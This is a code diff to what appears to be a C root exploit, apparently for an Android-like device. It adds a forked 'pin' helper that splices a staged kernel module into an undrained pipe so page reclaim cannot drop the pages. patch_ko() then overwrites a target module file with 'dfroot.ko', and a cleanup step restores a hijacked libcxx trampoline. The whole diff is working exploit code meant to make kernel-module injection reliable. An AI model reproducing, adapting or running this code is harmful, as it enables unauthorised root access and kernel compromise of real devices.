@@ -11,6 +11,7 @@
 #include <sys/socket.h>
 #include <sys/uio.h>
 #include <sys/wait.h>
+#include <signal.h>
 #include <sys/stat.h>
 #include <sys/utsname.h>
 #include <sys/mman.h>
@@ -144,6 +145,34 @@ static int spawn_crash_dump(off64_t offset, int write_fd, int target_fd, const c
     if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0))
         printf("bridge(%s) off=%s status=0x%x\n", mode ? mode : "splice", offstr, st);
     return st;
+}
+
+static int g_pin_pid = -1;
+static int g_pin_fd  = -1;
+
+/* Keep the staged module's pages pinned for the whole run: the bridge splices
+ * the file into a pipe it never drains, then sleeps. Pipe buffers hold page
+ * references, so reclaim cannot touch them - unlike an mmap, which this device
+ * happily unmaps over time. */
+static int spawn_pin_daemon(void)
+{
+    if (g_pin_pid > 0) return 0;
+    int p[2];
+    if (pipe(p) < 0) { printf("pin: pipe failed: %s\n", strerror(errno)); return -1; }
+    int pid = fork();
+    if (pid < 0) { close(p[0]); close(p[1]); printf("pin: fork failed\n"); return -1; }
+    if (pid == 0) {
+        int nul = open("/dev/null", O_WRONLY);
+        if (nul >= 0) { dup2(nul, 2); close(nul); }   /* keep fd 1 as the pipe */
+        if (p[1] != 1) dup2(p[1], 1);
+        execl(kCrashDump, "pin", "0", libcxx_ko_target, "P", NULL);
+        _exit(9);
+    }
+    close(p[1]);
+    g_pin_fd  = p[0];
+    g_pin_pid = pid;
+    printf("pin: staging pages held by bridge pid %d\n", pid);
+    return 0;
 }
 
 /* Ask the bridge for the size of a file it can open but we cannot stat. */
@@ -624,6 +653,10 @@ static int patch_ko(void) {
     g_ko_data = buf;
     g_ko_len  = len;
 
+    /* Pin the pages first: they must never be reclaimed while we patch them,
+     * and the pin has to be in place before the first write lands. */
+    spawn_pin_daemon();
+
     printf("patch: %s <- dfroot.ko (%zu bytes)\n", libcxx_ko_target, len);
     int ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);
     /* deliberately not freed: g_ko_data is re-checked at pre-load time */
@@ -632,6 +665,7 @@ static int patch_ko(void) {
 }
 
 static void cleanup(void) {
+    if (g_pin_pid > 0) { kill(g_pin_pid, SIGKILL); g_pin_pid = -1; }
     if (!g_libcxx_r.valid) return;
     printf("\n=== cleanup ===\n");
     printf("restoring trampoline in %s\n", g_libcxx_r.lib);
